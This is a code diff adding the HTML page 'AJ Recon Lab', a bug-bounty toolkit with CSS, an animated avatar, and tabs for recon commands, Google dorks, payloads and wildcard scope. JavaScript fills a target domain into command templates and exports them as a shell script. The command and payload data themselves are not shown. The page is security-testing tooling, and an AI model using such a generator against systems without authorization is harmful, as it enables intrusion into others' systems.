+    border: 1px solid rgba(191,95,255,0.25);
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 1.5rem;
+    font-family: 'Fira Code', monospace;
+    font-size: 0.82rem;
+    color: #d4b0ff;
+    line-height: 1.8;
+  }
+
+  .wild-intro strong { color: #bf5fff; }
+
+  .wild-cmd-card {
+    background: rgba(191,95,255,0.04);
+    border: 1px solid rgba(191,95,255,0.2);
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 0.6rem;
+    transition: border-color 0.2s;
+  }
+  .wild-cmd-card:hover { border-color: rgba(191,95,255,0.5); }
+
+  .wild-cmd-header {
+    background: rgba(191,95,255,0.07);
+    border-bottom: 1px solid rgba(191,95,255,0.15);
+    padding: 0.5rem 0.85rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .wild-cmd-desc { font-family: 'Fira Code', monospace; font-size: 0.76rem; color: #c890ff; }
+  .wild-cmd-code { font-family: 'Fira Code', monospace; font-size: 0.82rem; color: #e2f5e2; padding: 0.65rem 0.85rem; white-space: pre-wrap; word-break: break-all; line-height: 1.7; }
+
+  .wild-section-title {
+    font-family: 'Oxanium', monospace;
+    font-size: 0.72rem;
+    font-weight: 800;
+    letter-spacing: 0.15em;
+    color: #bf5fff;
+    text-transform: uppercase;
+    border-bottom: 1px solid rgba(191,95,255,0.3);
+    padding: 1.25rem 0 0.5rem;
+    margin-top: 1rem;
+  }
+
+  /* copy btn for dork/payload/wild */
+  .mini-copy {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.15);
+    color: #aaa;
+    font-family: 'Oxanium', monospace;
+    font-size: 0.58rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    padding: 0.18rem 0.55rem;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.2s;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+  .mini-copy:hover { background: rgba(255,255,255,0.1); color: #fff; }
+  .mini-copy.copied { background: rgba(0,255,65,0.12); border-color: var(--neon-green); color: var(--neon-green); }
+
+  body.light .dork-card { background: #f4fbff; border-color: rgba(0,120,180,0.2); }
+  body.light .dork-cat { color: #005f9e; background: rgba(0,120,180,0.07); }
+  body.light .dork-query { color: #1a3a1a; }
+  body.light .payload-card { background: #fff8f4; border-color: rgba(200,80,0,0.2); }
+  body.light .payload-label { color: #a04000; background: rgba(200,80,0,0.07); }
+  body.light .payload-code { color: #1a2a1a; }
+  body.light .wild-cmd-card { background: #fdf4ff; border-color: rgba(130,60,200,0.2); }
+  body.light .wild-cmd-desc { color: #6020a0; }
+  body.light .wild-cmd-code { color: #1a1a2a; }
+  body.light .wild-intro { background: rgba(130,60,200,0.05); border-color: rgba(130,60,200,0.2); color: #4a208a; }
+  body.light .tab-btn { color: #3a6a3a; border-color: rgba(0,140,60,0.25); background: #f5faf5; }
+  body.light .tab-btn.active { color: #050a05; }
+  body.light .tab-nav { background: var(--dark-bg); border-bottom-color: rgba(0,140,60,0.2); }
+</style>
+</head>
+<body>
+
+<div id="anime-bg" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; overflow: hidden; transition: opacity 0.5s;">
+  
+  <canvas id="mc" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.15;"></canvas>
+  
+  <div id="codeLayer" style="position:absolute;inset:0;pointer-events:none;overflow:hidden;"></div>
+  
+  <div style="position:absolute; top: 10px; left: 20px; transform: scale(0.65); transform-origin: top left;">
+    
+    <div style="position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:260px;height:50px;background:radial-gradient(ellipse,var(--neon-green) 0%,transparent 70%);border-radius:50%;opacity:0.5;animation:groundGlow 2.5s ease-in-out infinite;"></div>
+    
+    <svg width="340" height="520" viewBox="0 0 340 520" style="overflow:visible;animation:charFloat 3.8s ease-in-out infinite; opacity: 0.95;">
+      <defs>
+        <filter id="glow" x="-50%" y="-50%" width="200%" height="200%">
+          <feGaussianBlur stdDeviation="14" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+        <filter id="softGlow" x="-30%" y="-30%" width="160%" height="160%">
+          <feGaussianBlur stdDeviation="5" result="b"/>
+          <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+        <filter id="eyeFilter">
+          <feGaussianBlur stdDeviation="2.5" result="b"/>
+          <feMerge><feMergeNode in="b"/><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+        <radialGradient id="auraGrad" cx="50%" cy="60%" r="50%">
+          <stop offset="0%" stop-color="#00ff41" stop-opacity=".35"/>
+          <stop offset="50%" stop-color="#00e5ff" stop-opacity=".18"/>
+          <stop offset="100%" stop-color="#00ff41" stop-opacity="0"/>
+        </radialGradient>
+        <radialGradient id="auraGrad2" cx="50%" cy="55%" r="45%">
+          <stop offset="0%" stop-color="#00e5ff" stop-opacity=".25"/>
+          <stop offset="100%" stop-color="#00ff41" stop-opacity="0"/>
+        </radialGradient>
+        <linearGradient id="skinGrad" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0%" stop-color="#f5c9a4"/>
+          <stop offset="100%" stop-color="#e8b58a"/>
+        </linearGradient>
+        <linearGradient id="jacketGrad" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0%" stop-color="#111828"/>
+          <stop offset="100%" stop-color="#0a1018"/>
+        </linearGradient>
+      </defs>
+    
+      <ellipse cx="170" cy="390" rx="145" ry="370" fill="url(#auraGrad)" style="animation:auraPulse 2.2s ease-in-out infinite;"/>
+      <ellipse cx="170" cy="390" rx="110" ry="300" fill="url(#auraGrad2)" style="animation:auraPulse 2.2s ease-in-out infinite 0.4s;"/>
+    
+      <path d="M55 210 L82 265 L62 275 L95 325" fill="none" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="100" style="animation:bolt 3.5s ease-in-out infinite;"/>
+      <path d="M285 230 L258 282 L278 292 L245 340" fill="none" stroke="#00e5ff" stroke-width="1.5" stroke-linecap="round" stroke-dasharray="100" style="animation:bolt 3.5s ease-in-out infinite 0.8s;"/>
+      <path d="M42 290 L62 325 L48 332 L72 368" fill="none" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round" stroke-dasharray="80" opacity=".7" style="animation:bolt 4.5s ease-in-out infinite 1.5s;"/>
+      <path d="M298 275 L278 308 L292 315 L270 350" fill="none" stroke="#00e5ff" stroke-width="1.2" stroke-linecap="round" stroke-dasharray="80" opacity=".7" style="animation:bolt 4.5s ease-in-out infinite 2s;"/>
+    
+      <circle cx="40" cy="200" r="2.5" fill="#00ff41" style="animation:bolt 2s ease-in-out infinite .3s;"/>
+      <circle cx="300" cy="215" r="2" fill="#00e5ff" style="animation:bolt 2s ease-in-out infinite .9s;"/>
+      <circle cx="30" cy="310" r="2" fill="#00ff41" style="animation:bolt 3s ease-in-out infinite 1.6s;"/>
+      <circle cx="310" cy="295" r="2.5" fill="#00e5ff" style="animation:bolt 3s ease-in-out infinite .5s;"/>
+      <circle cx="60" cy="150" r="1.8" fill="#00ff41" style="animation:bolt 2.5s ease-in-out infinite 1s;"/>
+      <circle cx="280" cy="160" r="1.8" fill="#00e5ff" style="animation:bolt 2.5s ease-in-out infinite 2.2s;"/>
+    
+      <g fill="#0b0b18" stroke="#06060f" stroke-width="1.2" stroke-linejoin="round">
+        <path d="M 112 215 Q 90 175 82 118 Q 94 162 108 208 Z"/>
+        <path d="M 116 208 Q 100 152 102 90 Q 114 148 122 202 Z"/>
+        <path d="M 122 200 Q 118 128 126 58 Q 132 126 134 196 Z"/>
+        <path d="M 155 195 Q 160 105 168 12 Q 176 108 178 196 Z"/>
+        <path d="M 180 196 Q 186 122 196 55 Q 200 125 198 198 Z"/>
+        <path d="M 198 200 Q 215 148 220 90 Q 228 148 218 205 Z"/>
+        <path d="M 216 208 Q 234 165 240 118 Q 248 165 228 215 Z"/>
+        <path d="M 105 215 Q 98 255 100 280 Q 104 255 112 218 Z"/>
+        <path d="M 230 215 Q 238 255 236 280 Q 232 255 222 218 Z"/>
+      </g>
+    
+      <rect x="155" y="318" width="30" height="32" rx="5" fill="url(#skinGrad)"/>
+      <rect x="163" y="318" width="12" height="32" rx="3" fill="#d4a07a" opacity=".35"/>
+    
+      <path d="M 228 348 Q 248 372 255 405 Q 260 430 258 455" fill="none" stroke="#111826" stroke-width="24" stroke-linecap="round"/>
+      <path d="M 228 348 Q 248 372 255 405 Q 260 430 258 455" fill="none" stroke="#1a2438" stroke-width="20" stroke-linecap="round"/>
+      <path d="M 232 350 Q 250 374 257 408 Q 262 432 260 458" fill="none" stroke="url(#skinGrad)" stroke-width="13" stroke-linecap="round"/>
+      <ellipse cx="260" cy="462" rx="12" ry="9" fill="#e8b58a"/>
+      <ellipse cx="260" cy="462" rx="10" ry="7" fill="url(#skinGrad)"/>
+    
+      <path d="M 100 340 Q 90 380 90 440 L 250 440 Q 250 380 240 340 Q 220 328 170 328 Q 120 328 100 340 Z" fill="url(#jacketGrad)"/>
+      <path d="M 148 330 L 170 400 L 192 330 Q 180 322 170 322 Q 160 322 148 330 Z" fill="#0d1420"/>
+      <path d="M 156 332 L 170 392 L 184 332 Q 175 327 170 327 Q 165 327 156 332 Z" fill="url(#skinGrad)"/>
+      <path d="M 146 328 Q 124 340 100 365 L 114 352 Q 134 336 148 328 Z" fill="#141f2e" stroke="#00e5ff" stroke-width=".7" stroke-opacity=".6"/>
+      <path d="M 194 328 Q 216 340 240 365 L 226 352 Q 206 336 192 328 Z" fill="#141f2e" stroke="#00e5ff" stroke-width=".7" stroke-opacity=".6"/>
+      <path d="M 100 342 Q 92 380 94 435" fill="none" stroke="#00e5ff" stroke-width="1.8" stroke-opacity=".8"/>
+      <path d="M 240 342 Q 248 380 246 435" fill="none" stroke="#00e5ff" stroke-width="1.8" stroke-opacity=".8"/>
+      <rect x="100" y="408" width="140" height="14" rx="4" fill="#0a0f18" stroke="#00e5ff" stroke-width="1" stroke-opacity=".7"/>
+      <line x1="170" y1="408" x2="170" y2="422" stroke="#00e5ff" stroke-width="1.5" stroke-opacity=".7"/>
+      <rect x="162" y="410" width="16" height="10" rx="2" fill="#00e5ff22" stroke="#00e5ff" stroke-width=".8" stroke-opacity=".9"/>
+    
+      <path d="M 112 345 Q 88 315 68 278 Q 52 248 38 218" fill="none" stroke="#111826" stroke-width="24" stroke-linecap="round"/>
+      <path d="M 112 345 Q 88 315 68 278 Q 52 248 38 218" fill="none" stroke="#1a2438" stroke-width="20" stroke-linecap="round"/>
+      <path d="M 110 347 Q 86 316 66 278 Q 50 248 36 218" fill="none" stroke="url(#skinGrad)" stroke-width="13" stroke-linecap="round"/>
+      <ellipse cx="35" cy="213" rx="13" ry="10" fill="#e8b58a"/>
+      <ellipse cx="35" cy="213" rx="11" ry="8" fill="url(#skinGrad)"/>
+    
+      <circle cx="28" cy="196" r="22" fill="#00ff4115" stroke="#00ff41" stroke-width="1" opacity=".6" filter="url(#glow)" style="animation:auraPulse 1.1s ease-in-out infinite;"/>
+      <circle cx="28" cy="196" r="15" fill="#00ff4130" stroke="#00ff41" stroke-width="1.2" style="animation:auraPulse 1s ease-in-out infinite .15s;"/>
+      <circle cx="28" cy="196" r="9" fill="#00ff4170" filter="url(#softGlow)"/>
+      <circle cx="28" cy="196" r="5" fill="#00ff41cc"/>
+      <circle cx="28" cy="196" r="2.5" fill="white"/>
+      <path d="M 28 180 L 25 170 M 38 190 L 47 186 M 32 208 L 35 218 M 14 193 L 5 190" fill="none" stroke="#00ff41" stroke-width="1.2" stroke-linecap="round" style="animation:bolt 1.5s ease-in-out infinite;"/>
+    
+      <path d="M 100 438 Q 98 452 100 475 L 150 475 L 152 440 Z" fill="#0c1220" stroke="#00e5ff44" stroke-width=".8"/>
+      <path d="M 240 438 Q 242 452 240 475 L 190 475 L 188 440 Z" fill="#0c1220" stroke="#00e5ff44" stroke-width=".8"/>
+      <line x1="170" y1="440" x2="170" y2="475" stroke="#00e5ff" stroke-width=".8" stroke-opacity=".5"/>
+      <path d="M 100 470 Q 92 476 88 482 Q 93 488 150 488 L 152 474 Z" fill="#060a10" stroke="#00e5ff66" stroke-width=".8"/>
+      <path d="M 240 470 Q 248 476 252 482 Q 247 488 190 488 L 188 474 Z" fill="#060a10" stroke="#00e5ff66" stroke-width=".8"/>
+      <path d="M 96 473 Q 90 478 89 484" fill="none" stroke="#00e5ff" stroke-width=".8" stroke-opacity=".5"/>
+      <path d="M 244 473 Q 250 478 251 484" fill="none" stroke="#00e5ff" stroke-width=".8" stroke-opacity=".5"/>
+    
+      <ellipse cx="170" cy="258" rx="48" ry="56" fill="url(#skinGrad)"/>
+      <path d="M 125 268 Q 122 295 135 318 Q 150 336 170 338 Q 190 336 205 318 Q 218 295 215 268" fill="url(#skinGrad)" stroke="none"/>
+      <ellipse cx="123" cy="262" rx="9" ry="11" fill="#e8b58a"/>
+      <ellipse cx="217" cy="262" rx="9" ry="11" fill="#e8b58a"/>
+      <ellipse cx="123" cy="262" rx="5" ry="6" fill="#d4a07a" opacity=".5"/>
+      <ellipse cx="217" cy="262" rx="5" ry="6" fill="#d4a07a" opacity=".5"/>
+      <ellipse cx="135" cy="282" rx="14" ry="8" fill="#d4906a" opacity=".2"/>
+      <ellipse cx="205" cy="282" rx="14" ry="8" fill="#d4906a" opacity=".2"/>
+      <path d="M 132 228 Q 142 218 158 221" fill="none" stroke="#2a1a0a" stroke-width="3" stroke-linecap="round"/>
+      <path d="M 182 221 Q 196 218 206 228" fill="none" stroke="#2a1a0a" stroke-width="3" stroke-linecap="round"/>
+      <path d="M 158 223 L 165 227" fill="none" stroke="#2a1a0a" stroke-width="2" stroke-linecap="round"/>
+      <path d="M 182 223 L 175 227" fill="none" stroke="#2a1a0a" stroke-width="2" stroke-linecap="round"/>
+    
+      <path d="M 132 246 Q 137 234 150 236 Q 161 238 162 248 Q 160 260 149 261 Q 136 260 132 246 Z" fill="white"/>
+      <circle cx="148" cy="248" r="9" fill="#001f05"/>
+      <circle cx="148" cy="248" r="7" fill="#00cc33" opacity=".6" filter="url(#eyeFilter)" style="animation:eyeGlow 1.8s ease-in-out infinite;"/>
+      <circle cx="148" cy="248" r="5" fill="#00ff41" opacity=".8"/>
+      <circle cx="148" cy="248" r="3" fill="#00ff41"/>
+      <circle cx="151" cy="244" r="2.5" fill="white" opacity=".85"/>
+      <path d="M 132 246 Q 137 234 150 236 Q 161 238 162 248" fill="none" stroke="#1a0f08" stroke-width="2.2" stroke-linecap="round"/>
+      <path d="M 133 248 Q 136 258 149 260 Q 160 258 162 249" fill="none" stroke="#1a0f08" stroke-width="1" stroke-linecap="round" opacity=".4"/>
+    
+      <path d="M 178 248 Q 179 236 190 235 Q 203 234 208 246 Q 208 258 197 261 Q 182 262 178 248 Z" fill="white"/>
+      <circle cx="193" cy="247" r="9" fill="#001f05"/>
+      <circle cx="193" cy="247" r="7" fill="#00cc33" opacity=".6" filter="url(#eyeFilter)" style="animation:eyeGlow 1.8s ease-in-out infinite .4s;"/>
+      <circle cx="193" cy="247" r="5" fill="#00ff41" opacity=".8"/>
+      <circle cx="193" cy="247" r="3" fill="#00ff41"/>
+      <circle cx="196" cy="243" r="2.5" fill="white" opacity=".85"/>
+      <path d="M 178 248 Q 179 236 190 235 Q 203 234 208 246" fill="none" stroke="#1a0f08" stroke-width="2.2" stroke-linecap="round"/>
+      <path d="M 179 249 Q 182 259 194 261 Q 206 259 208 248" fill="none" stroke="#1a0f08" stroke-width="1" stroke-linecap="round" opacity=".4"/>
+    
+      <path d="M 165 277 Q 170 284 175 277" fill="none" stroke="#c48a6a" stroke-width="1.8" stroke-linecap="round"/>
+      <path d="M 162 274 Q 160 280 163 283" fill="none" stroke="#c48a6a" stroke-width="1.2" stroke-linecap="round" opacity=".5"/>
+      <path d="M 178 274 Q 180 280 177 283" fill="none" stroke="#c48a6a" stroke-width="1.2" stroke-linecap="round" opacity=".5"/>
+      <path d="M 158 305 Q 168 313 178 308 Q 182 306 184 302" fill="none" stroke="#b06040" stroke-width="2.2" stroke-linecap="round"/>
+      <path d="M 158 305 Q 156 302 158 299" fill="none" stroke="#b06040" stroke-width="1.5" stroke-linecap="round" opacity=".6"/>
+    
+      <g fill="#0b0b18">
+        <path d="M 126 234 Q 130 200 138 172 Q 142 204 140 232 Z"/>
+        <path d="M 138 228 Q 145 196 148 168 Q 151 196 150 227 Z"/>
+        <path d="M 214 232 Q 210 200 202 172 Q 198 204 200 230 Z"/>
+        <path d="M 202 227 Q 196 194 192 168 Q 189 196 190 227 Z"/>
+        <path d="M 163 222 Q 166 190 168 158 Q 172 188 172 220 Z"/>
+      </g>
+    
+      <path d="M 148 248 L 128 240 M 148 248 L 135 260" fill="none" stroke="#00ff41" stroke-width=".6" stroke-opacity=".3"/>
+      <path d="M 193 247 L 213 240 M 193 247 L 206 260" fill="none" stroke="#00ff41" stroke-width=".6" stroke-opacity=".3"/>
+    </svg>
+  </div>
+</div>
+  
+  <div id="codeLayer" style="position:absolute;inset:0;pointer-events:none;overflow:hidden;"></div>
+</div>
+<!-- THEME TOGGLE -->
+<button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">
+  <span class="toggle-icon" id="themeIcon">☀️</span>
+  <span id="themeLabel">LIGHT</span>
+</button>
+
+<!-- HEADER -->
+<header class="site-header">
+  <div class="logo-text">
+    <span class="logo-bracket">[</span>&nbsp;AJ RECON LAB&nbsp;<span class="logo-bracket">]</span>
+  </div>
+  <div class="subtitle">◈ Full Bug Bounty Arsenal v3 ◈</div>
+  <div class="status-bar">
+    <span class="status-item">Passive Recon</span>
+    <span class="status-item">Active Enum</span>
+    <span class="status-item">Vuln Scanning</span>
+    <span class="status-item">Exploitation</span>
+    <span class="status-item">Reporting</span>
+  </div>
+</header>
+
+<!-- TAB NAVIGATION -->
+<nav class="tab-nav">
+  <button class="tab-btn active" onclick="switchTab('arsenal',this)">⚔️ Arsenal</button>
+  <button class="tab-btn tab-dork" onclick="switchTab('dorks',this)">🔎 Google Dorks</button>
+  <button class="tab-btn tab-pay" onclick="switchTab('payloads',this)">💣 Payloads</button>
+  <button class="tab-btn tab-wild" onclick="switchTab('wildcard',this)">🌐 Wildcard Scope</button>
+</nav>
+
+<!-- ════════════ TAB: ARSENAL ════════════ -->
+<div id="tab-arsenal" class="tab-panel active">
+
+<!-- INPUT SECTION -->
+<section class="input-section">
+  <div class="input-wrapper">
+    <label class="input-label" for="targetDomain">⌗ Enter Target Domain</label>
+    <div class="input-row">
+      <input type="text" id="targetDomain" placeholder="example.com" autocomplete="off" spellcheck="false" oninput="domainHint(this)" />
+      <button class="generate-btn" onclick="generateToolkit()">▶ GENERATE</button>
+    </div>
+    <div id="domainHintMsg" style="font-family:'Fira Code',monospace;font-size:0.7rem;color:#7de8ff;margin-top:0.4rem;min-height:1rem;display:none;">
+      ↳ Protocol auto-stripped
+    </div>
+  </div>
+</section>
+
+<!-- RESULTS CONTAINER -->
+<div id="resultsContainer">
+  <div class="results-header">
+    <span>// RECON ARSENAL LOADED — <span class="cursor">█</span></span>
+    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap;">
+      <span id="targetBadge" class="target-badge"></span>
+      <button class="expand-all-btn" onclick="toggleAll()">EXPAND ALL</button>
+    </div>
+  </div>
+<!-- ARSENAL SEARCH + EXPORT CONTROLS -->
+  <div class="arsenal-controls" id="arsenalControls" style="display:none;">
+    <input class="search-input" id="arsenalSearch" type="text" placeholder="🔍  Search sections, tags, commands…" autocomplete="off" spellcheck="false" oninput="filterArsenal(this.value)" />
+    <span class="section-count-badge" id="sectionCountBadge"></span>
+    <button class="export-btn" onclick="exportScript()">⬇ EXPORT .SH</button>
+  </div>
+  <div class="no-results-msg" id="noResultsMsg">No sections match your search.</div>
+  <div id="accordionList"></div>
+</div>
+
+</div><!-- end tab-arsenal -->
+
+<!-- ════════════ TAB: GOOGLE DORKS ════════════ -->
+<div id="tab-dorks" class="tab-panel">
+<div style="max-width:1200px;margin:0 auto;padding:1.5rem 1rem;">
+
+  <div style="margin-bottom:1rem;">
+    <div class="input-row" style="margin-bottom:0.75rem;">
+      <input type="text" id="dorkDomain" class="cmd-code" style="flex:1;min-width:180px;background:var(--panel-bg);border:1px solid var(--border-cyan);color:var(--neon-cyan);font-family:'Fira Code',monospace;font-size:0.9rem;padding:0.65rem 1rem;border-radius:3px;outline:none;" placeholder="target.com — auto-fills dorks" autocomplete="off" oninput="renderDorks()" />
+      <button class="generate-btn" style="border-color:var(--neon-cyan);color:var(--neon-cyan);" onclick="renderDorks()">▶ LOAD DORKS</button>
+    </div>
+    <div class="dork-filter-bar" id="dorkFilters"></div>
+  </div>
+
+  <div class="dork-grid" id="dorkGrid"></div>
+</div>
+</div><!-- end tab-dorks -->
+
+<!-- ════════════ TAB: PAYLOADS ════════════ -->
+<div id="tab-payloads" class="tab-panel">
+<div style="max-width:1100px;margin:0 auto;padding:1.5rem 1rem;" id="payloadContainer"></div>
+</div><!-- end tab-payloads -->
+
+<!-- ════════════ TAB: WILDCARD SCOPE ════════════ -->
+<div id="tab-wildcard" class="tab-panel">
+<div style="max-width:1100px;margin:0 auto;padding:1.5rem 1rem;">
+
+  <div class="wild-intro">
+    <strong>🌐 Wildcard Scope Mode</strong> — Target is <strong>*.example.com</strong>. Iska matlab har subdomain in-scope hai.<br>
+    Yahan par strategies hain jo wildcard programs (HackerOne/Bugcrowd) ke liye specifically kaam aati hain.<br>
+    <div style="margin-top:0.5rem;">
+      <input type="text" id="wildcardBase" style="background:rgba(191,95,255,0.1);border:1px solid rgba(191,95,255,0.4);color:#d4b0ff;font-family:'Fira Code',monospace;font-size:0.9rem;padding:0.5rem 0.85rem;border-radius:3px;outline:none;width:100%;max-width:340px;" placeholder="example.com (base domain)" oninput="renderWild()" />
+    </div>
+  </div>
+
+  <div id="wildContent"></div>
+</div>
+</div><!-- end tab-wildcard -->
+
+<footer>
+  &gt; AJ RECON LAB v3 — FOR AUTHORIZED TESTING ONLY. ALWAYS GET WRITTEN PERMISSION BEFORE PENTESTING. &lt;<br>
+  <span style="color:#2a4a2a;margin-top:0.4rem;display:block;">// Use responsibly. Happy hunting. 🐛</span>
+</footer>
+
+<script>
+let currentDomain = 'example.com';
+let allExpanded = false;
+const cmdStore = [];
+const sectionMeta = []; // {title, tags, startIdx, endIdx} for export + copy-all + search
+
+// ── THEME ──
+function toggleTheme() {
+  const isLight = document.body.classList.toggle('light');
+  document.getElementById('themeIcon').textContent  = isLight ? '🌙' : '☀️';
+  document.getElementById('themeLabel').textContent = isLight ? 'DARK' : 'LIGHT';
+  localStorage.setItem('ajTheme', isLight ? 'light' : 'dark');
+}
+(function() {
+  if (localStorage.getItem('ajTheme') === 'light') {
+    document.body.classList.add('light');
+    document.getElementById('themeIcon').textContent  = '🌙';
+    document.getElementById('themeLabel').textContent = 'DARK';
+  }
+})();
+
+// ── TABS ──
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  btn.classList.add('active');
+  // Sync domain across tabs
+  const mainDomain = document.getElementById('targetDomain').value.trim()
+    .replace(/^https?:\/\//i,'').replace(/[^a-zA-Z0-9.\-]/g,'');
+  if (name === 'dorks') {
+    if (mainDomain) document.getElementById('dorkDomain').value = mainDomain;
+    renderDorks();
+  }
+  if (name === 'payloads') renderPayloads();
+  if (name === 'wildcard') {
+    if (mainDomain) document.getElementById('wildcardBase').value = mainDomain;
+    renderWild();
+  }
+}
+
+// ── ARSENAL HELPERS ──
+function generateToolkit() {
+  let raw = document.getElementById('targetDomain').value.trim();
+  // Strip protocol silently
+  const stripped = raw.replace(/^https?:\/\//i,'').replace(/\/.*$/,'');
+  if (stripped !== raw) {
+    document.getElementById('targetDomain').value = stripped;
+    raw = stripped;
+  }
+  const input = raw.replace(/[^a-zA-Z0-9.\-]/g, '');
+  if (!input) {
+    const el = document.getElementById('targetDomain');
+    el.focus(); el.style.borderColor = '#ff4444';
+    setTimeout(() => el.style.borderColor = '', 1500); return;
+  }
+  currentDomain = input;
+  // Reset state
+  allExpanded = false;
+  const expandBtn = document.querySelector('.expand-all-btn');
+  if (expandBtn) expandBtn.textContent = 'EXPAND ALL';
+  // Clear search
+  const searchEl = document.getElementById('arsenalSearch');
+  if (searchEl) searchEl.value = '';
+  document.getElementById('targetBadge').textContent = '🎯 ' + currentDomain;
+  const container = document.getElementById('resultsContainer');
+  container.style.display = 'block';
+  document.getElementById('arsenalControls').style.display = 'flex';
+  cmdStore.length = 0;
+  sectionMeta.length = 0;
+  renderAccordion();
+  updateSectionCount();
+  container.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('targetDomain').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') generateToolkit();
+  });
+  renderPayloads();
+  renderDorks();
+  renderWild();
+});
+
+function c(str) { return str.replace(/DOMAIN/g, currentDomain); }
+
+function domainHint(el) {
+  const hasProto = /^https?:\/\//i.test(el.value);
+  const hint = document.getElementById('domainHintMsg');
+  hint.style.display = hasProto ? 'block' : 'none';
+}
+
+function filterArsenal(query) {
+  const q = query.toLowerCase().trim();
+  const items = document.querySelectorAll('#accordionList .accordion-item');
+  let visible = 0;
+  items.forEach(item => {
+    const title = item.dataset.sectionTitle || '';
+    const tags  = item.dataset.sectionTags  || '';
+    const code  = item.querySelectorAll('.cmd-code, .cmd-desc');
+    let codeText = '';
+    code.forEach(el => { codeText += el.textContent.toLowerCase() + ' '; });
+    const match = !q || title.includes(q) || tags.includes(q) || codeText.includes(q);
+    item.style.display = match ? '' : 'none';
+    if (match) visible++;
+  });
+  updateSectionCount(visible);
+  document.getElementById('noResultsMsg').style.display = (visible === 0 && q) ? 'block' : 'none';
+}
+
+function updateSectionCount(count) {
+  const badge = document.getElementById('sectionCountBadge');
+  if (!badge) return;
+  const total = sectionMeta.length;
+  const shown = count !== undefined ? count : total;
+  badge.textContent = shown === total ? `${total} sections` : `${shown} / ${total} sections`;
+}
+
+function copyAllSection(btn, metaIdx) {
+  const meta = sectionMeta[metaIdx];
+  if (!meta) return;
+  const cmds = cmdStore.slice(meta.startIdx, meta.endIdx);
+  const text = `# === ${meta.title} ===\n` + cmds.join('\n\n') + '\n';
+  navigator.clipboard.writeText(text).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+  });
+  btn.textContent = '✓ COPIED'; btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'COPY ALL'; btn.classList.remove('copied'); }, 2000);
+}
+
+function exportScript() {
+  if (!sectionMeta.length) return;
+  let script = `#!/usr/bin/env bash\n# AJ Recon Lab — Generated for: ${currentDomain}\n# Generated: ${new Date().toLocaleString()}\n# ===============================================\n\nDOMAIN="${currentDomain}"\n\n`;
+  sectionMeta.forEach(meta => {
+    script += `\n# ────────────────────────────────────\n# ${meta.title}\n# ────────────────────────────────────\n`;
+    const cmds = cmdStore.slice(meta.startIdx, meta.endIdx);
+    cmds.forEach(cmd => { script += `\n${cmd}\n`; });
+  });
+  const blob = new Blob([script], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = `recon_${currentDomain}.sh`;
+  document.body.appendChild(a); a.click();
+  document.body.removeChild(a); URL.revokeObjectURL(url);
+}
+
+
+
+function toggleAll() {
+  allExpanded = !allExpanded;
+  document.querySelectorAll('.accordion-item').forEach(item => {
+    if (allExpanded) item.classList.add('open'); else item.classList.remove('open');
+  });
+  document.querySelector('.expand-all-btn').textContent = allExpanded ? 'COLLAPSE ALL' : 'EXPAND ALL';
+}
+
+function toggleAccordion(el) { el.closest('.accordion-item').classList.toggle('open'); }
+
+function copyCmd(btn, idx) {
+  const text = cmdStore[idx];
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ COPIED'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent = '✓ COPIED'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+
+function miniCopy(btn, text) {
+  navigator.clipboard.writeText(text).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position='fixed'; ta.style.opacity='0';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+  });
+  btn.textContent = '✓'; btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1600);
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function buildCmdCard(desc, raw) {
+  const cmd = c(raw);
+  const idx = cmdStore.length;
+  cmdStore.push(cmd);
+  return `<div class="cmd-card">
+    <div class="cmd-header">
+      <span class="cmd-desc">${escHtml(desc)}</span>
+      <button class="copy-btn" onclick="copyCmd(this,${idx})">COPY</button>
+    </div>
+    <div class="cmd-code">${escHtml(cmd)}</div>
+  </div>`;
+}
+
+function buildWorkflow(steps) {
